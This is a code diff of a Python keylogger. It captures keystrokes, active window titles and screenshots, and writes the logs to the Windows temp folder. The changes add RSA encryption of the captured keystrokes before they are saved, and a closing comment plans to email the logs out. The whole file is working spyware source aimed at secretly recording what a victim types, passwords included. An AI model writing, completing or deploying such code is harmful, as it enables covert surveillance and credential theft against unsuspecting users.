@@ -5,15 +5,16 @@ import random
 import time
 import os
 import pyautogui
+from encryptionsys import *
+from Crypto.PublicKey import RSA
 
+path = os.path.expandvars("%tmp%")
 chars = 0
 data = []
-#kl = []
 fileName = str(chars) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
 
 def on_press(key):
-    #global kl
-    
+
     subs = ['Key.enter', ' [ENTER] ', 'Key.backspace', ' [BACKSPACE] ', 'Key.space', ' ',
             'Key.alt_l', ' [ALT] ', 'Key.tab', ' [TAB] ', 'Key.delete', ' [DEL] ', 'Key.ctrl_l', ' [CTRL] ',
             'Key.left', ' [LEFT ARROW] ', 'Key.right', ' [RIGHT ARROW] ', 'Key.shift', ' [SHIFT] ', '\\x13',
@@ -28,15 +29,24 @@ def on_press(key):
         data.append(keyPressed)
 
     print("".join(data)) # debug statement to see chars
-    writeLogs(os.path.expandvars("%tmp%"))
+    writeLogs(path)
 
 
 def writeLogs(path):
-    #path = os.path.expandvars("%tmp%")
+    with open('public_key.pem', 'rb') as f:
+        new_public_key = RSA.import_key(f.read())
+
+    with open('private_key.pem', 'rb') as f:
+        new_private_key = RSA.import_key(f.read())
+
+    ciphertext = encryption(new_public_key, bytes("".join(data).encode()));
+    decypted_text = decryption(new_private_key, ciphertext)
+
     with open(fileName, "a") as f:
-        #new_data = [item.strip("'") for item in data]
-        f.write(''.join(data))
+        f.write("".join(str(ciphertext)))
         f.close()
+
+    print(decypted_text.decode())
 
 def appListener():
     appOpen = win32gui.GetWindowText(win32gui.GetForegroundWindow())
@@ -49,8 +59,8 @@ def appListener():
 def takeScreenshot():
     screenshot = pyautogui.screenshot()
     screenshot.save("screen.png")
-    #to finish this
 
+    #to finish this
 
 
 # add a function to send the logs via email
